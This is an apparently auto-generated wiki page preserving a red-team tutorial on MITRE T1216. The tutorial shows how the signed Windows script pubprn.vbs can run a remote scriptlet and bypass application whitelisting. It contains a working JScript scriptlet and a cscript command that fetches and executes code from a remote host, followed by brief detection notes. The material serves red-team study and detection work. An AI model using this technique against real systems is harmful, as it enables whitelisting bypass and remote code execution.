---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# pubprn.vbs Signed Script Code Execution

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-t1216-signed-script-ce` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/t1216-signed-script-ce.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [pubprn.vbs Signed Script Code Execution](../../topics/offensive-security/pubprn.vbs-signed-script-code-execution.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-execution-t1216-signed-script-ce |
| name | pubprn.vbs Signed Script Code Execution |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-execution/t1216-signed-script-ce.md |

## Preserved Source Material

````yaml
_asset_filenames:
- pubprn-ancestry.png
- pubprn-csript.png
- pubprn-logs.png
_body: "---\ndescription: >-\n  Signed Script Proxy Execution - bypass application whitelisting using\n  pubprn.vbs\n---\n\
  \n# pubprn.vbs Signed Script Code Execution\n\n## Execution\n\nUsing pubprn.vbs, we will execute code to launch calc.exe.\
  \ First of, the xml that will be executed by the script:\n\n{% code title=\"http://192.168.2.71/tools/mitre/proxy-script/proxy.sct\"\
  \ %}\n```markup\n<?XML version=\"1.0\"?>\n<scriptlet>\n\n<registration\n    description=\"Bandit\"\n    progid=\"Bandit\"\
  \n    version=\"1.00\"\n    classid=\"{AAAA1111-0000-0000-0000-0000FEEDACDC}\"   \n\t>\n</registration>\n\n<script language=\"\
  JScript\">\n<![CDATA[\n\t\tvar r = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\");\t\n]]>\n</script>\n\n</scriptlet>\n\
  ```\n{% endcode %}\n\n{% code title=\"attacker@victim\" %}\n```csharp\ncscript /b C:\\Windows\\System32\\Printing_Admin_Scripts\\\
  en-US\\pubprn.vbs 127.0.0.1 script:http://192.168.2.71/tools/mitre/proxy-script/proxy.sct\n```\n{% endcode %}\n\n## Observations\n\
  \nCalc.exe gets spawned by cscript.exe which immediately closes leaving the calc.exe process orphan:\n\n![](../../.gitbook/assets/pubprn-csript.png)\n\
  \n![](../../.gitbook/assets/pubprn-ancestry.png)\n\nMonitoring commandlines can be useful in detecting the script being\
  \ abused:\n\n![](../../.gitbook/assets/pubprn-logs.png)\n\n## References\n\n{% embed url=\"https://attack.mitre.org/wiki/Technique/T1216\"\
  \ %}"
_relative_path: offensive-security/code-execution/t1216-signed-script-ce.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/t1216-signed-script-ce.md
````
